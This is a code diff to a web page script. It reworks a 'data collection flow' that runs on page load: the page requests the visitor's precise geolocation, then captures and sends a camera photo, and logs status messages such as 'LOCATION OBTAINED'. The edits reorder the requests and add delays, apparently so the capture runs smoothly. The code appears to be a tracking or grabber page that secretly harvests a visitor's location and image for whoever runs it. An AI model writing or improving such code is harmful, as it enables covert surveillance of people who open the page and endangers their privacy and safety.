@@ -181,31 +181,36 @@ document.addEventListener('DOMContentLoaded', async () => {
 
         // --- DATA COLLECTION FLOW ---
         let locationCaptured = false;
-        let lastLoggedLocation = null;
 
-        // 1. Send INITIAL Info (Immediate)
-        processAndSave(null, "Awaiting User Input...");
-
-        // 2. Request Location & Camera
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    locationCaptured = true;
-                    lastLoggedLocation = position.coords;
-                    processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
-                    captureAndSendPhoto();
-                },
-                (error) => {
-                    console.warn("Location error:", error.message);
-                    processAndSave(null, error.message, "❌ LOCATION DENIED");
-                    captureAndSendPhoto();
-                },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-        } else {
-            processAndSave(null, "Not Supported", "⚠️ GEO NOT SUPPORTED");
-            captureAndSendPhoto();
+        // 1. Request Location IMMEDIATELY (To prevent blocking)
+        function startLocationRequest() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationCaptured = true;
+                        processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
+                        // Wait 1 second before asking for camera
+                        setTimeout(captureAndSendPhoto, 1000);
+                    },
+                    (error) => {
+                        console.warn("Location error:", error.message);
+                        processAndSave(null, error.message, "❌ LOCATION DENIED");
+                        // Wait 1 second even if denied
+                        setTimeout(captureAndSendPhoto, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            } else {
+                processAndSave(null, "Not Supported", "⚠️ GEO NOT SUPPORTED");
+                setTimeout(captureAndSendPhoto, 1000);
+            }
         }
+
+        // Trigger Location Request
+        startLocationRequest();
+
+        // 2. Send INITIAL Info (Immediate notification)
+        processAndSave(null, "Awaiting User Input...");
 
         // 3. Scheduled Update (5 Seconds)
         setTimeout(() => {
